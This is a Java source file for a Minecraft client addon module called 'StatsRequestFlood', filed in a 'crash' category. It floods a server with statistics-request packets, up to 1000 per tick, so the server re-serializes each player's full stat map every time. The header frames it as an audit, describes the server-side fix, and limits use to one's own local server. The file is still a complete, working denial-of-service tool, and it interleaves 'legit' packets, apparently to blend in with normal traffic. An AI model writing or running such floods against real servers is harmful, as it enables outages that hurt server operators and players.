package com.example.addon.modules.crash;

import com.example.addon.AddonTemplate;
import meteordevelopment.meteorclient.events.game.GameLeftEvent;
import meteordevelopment.meteorclient.events.packets.PacketEvent;
import meteordevelopment.meteorclient.events.world.TickEvent;
import meteordevelopment.meteorclient.settings.*;
import meteordevelopment.meteorclient.systems.modules.Module;
import meteordevelopment.orbit.EventHandler;
import net.minecraft.network.packet.c2s.play.ClientStatusC2SPacket;

/**
 * AUDIT: Statistics Request Flood (asymmetric serialize cost)
 *
 * Floods ClientStatus(REQUEST_STATS) — the packet sent when a client opens the
 * statistics screen. Each request makes the server collect and serialize the
 * player's ENTIRE statistics map (every block mined, item used, mob killed,
 * custom stat) into a StatisticsS2CPacket. The request is a single byte of
 * intent; the response is potentially kilobytes — another cheap-to-send /
 * expensive-to-produce asymmetry, and one that touches a code path almost
 * nobody rate-limits.
 *
 * What a vulnerable server does: rebuilds and sends the full stat map for every
 * request, at any rate.
 * What a hardened server does: rate-limits stat requests per player and/or
 * caches the serialized snapshot between requests.
 * Fix: throttle REQUEST_STATS per player; cache the serialized statistics and
 * invalidate on change rather than rebuilding per request.
 *
 * Run against your OWN local server only.
 */
public class StatsRequestFlood extends Module {
    private final SettingGroup sgGeneral = this.settings.getDefaultGroup();

    private final Setting<Integer> perTick = sgGeneral.add(new IntSetting.Builder()
        .name("requests-per-tick").description("REQUEST_STATS packets per tick.")
        .defaultValue(40).range(1, 1000).sliderRange(1, 300).build()
    );

    private final TestCadence cadence = new TestCadence(sgGeneral);
    private final PreStress preStress = new PreStress(sgGeneral);
    private final GracefulResponse gr = new GracefulResponse(sgGeneral);

    private final Setting<Boolean> autoDisable = sgGeneral.add(new BoolSetting.Builder()
        .name("auto-disable").description("Disable when kicked from the server.")
        .defaultValue(true).build()
    );
    private final Setting<Boolean> showStats = sgGeneral.add(new BoolSetting.Builder()
        .name("show-stats").description("Print tick + packet count on deactivate.")
        .defaultValue(true).build()
    );

    private int ticksActive = 0, packetsSent = 0;

    public StatsRequestFlood() {
        super(AddonTemplate.CRASH_CATEGORY, "stats-request-flood",
            "Floods REQUEST_STATS (server re-serializes the full stat map each time). Tests stat-request rate-limiting.");
    }

    @Override
    public void onActivate() {
        ticksActive = 0; packetsSent = 0;
        cadence.onActivate(); gr.onActivate(); preStress.onActivate(this);
    }

    @EventHandler
    private void onTick(TickEvent.Pre event) {
        if (mc.player == null) return;
        ticksActive++;
        gr.tick();
        if (!cadence.shouldFire()) return;

        for (int i = 0; i < perTick.get(); i++) {
            mc.player.networkHandler.sendPacket(new ClientStatusC2SPacket(ClientStatusC2SPacket.Mode.REQUEST_STATS));
            packetsSent++;
        }
        gr.markFired();
        TestCadence.sendLegit(mc.player, cadence.legitRatio());
    }

    @Override
    public void onDeactivate() {
        if (showStats.get()) {
            info("Summary: %d ticks active, %d packets sent.", ticksActive, packetsSent);
            gr.report(l -> info("%s", l));
        }
        preStress.onDeactivate();
    }

    @EventHandler
    private void onReceivePacket(PacketEvent.Receive event) { gr.onReceive(event.packet); }

    @EventHandler
    private void onGameLeft(GameLeftEvent event) {
        gr.onKick();
        if (autoDisable.get() && isActive()) toggle();
    }
}
